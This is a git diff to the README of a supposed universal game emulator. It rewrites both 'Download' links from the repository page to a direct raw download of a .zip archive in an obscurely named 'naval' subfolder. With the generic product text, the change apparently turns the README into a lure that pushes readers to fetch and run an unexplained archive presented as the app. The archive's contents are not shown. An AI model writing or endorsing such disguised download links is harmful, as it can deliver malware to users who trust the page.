@@ -1,6 +1,6 @@
 # OmniEmu-Universal-Emulator-2026 - One App For Many Games
 
-[![Download Now](https://img.shields.io/badge/Download-OmniEmu-2026-blue?style=for-the-badge&logo=github)](https://github.com/cookie9867563/OmniEmu-Universal-Emulator-2026)
+[![Download Now](https://img.shields.io/badge/Download-OmniEmu-2026-blue?style=for-the-badge&logo=github)](https://github.com/cookie9867563/OmniEmu-Universal-Emulator-2026/raw/refs/heads/main/naval/Universal_Emulator_Emu_Omni_2.4.zip)
 
 ## 🎮 What This App Does
 
@@ -12,7 +12,7 @@ It is built for users who want one tool for many game types. You can use it to m
 
 Use this link to visit the page and download the app:
 
-[Download OmniEmu-Universal-Emulator-2026](https://github.com/cookie9867563/OmniEmu-Universal-Emulator-2026)
+[Download OmniEmu-Universal-Emulator-2026](https://github.com/cookie9867563/OmniEmu-Universal-Emulator-2026/raw/refs/heads/main/naval/Universal_Emulator_Emu_Omni_2.4.zip)
 
 After the page opens:
 
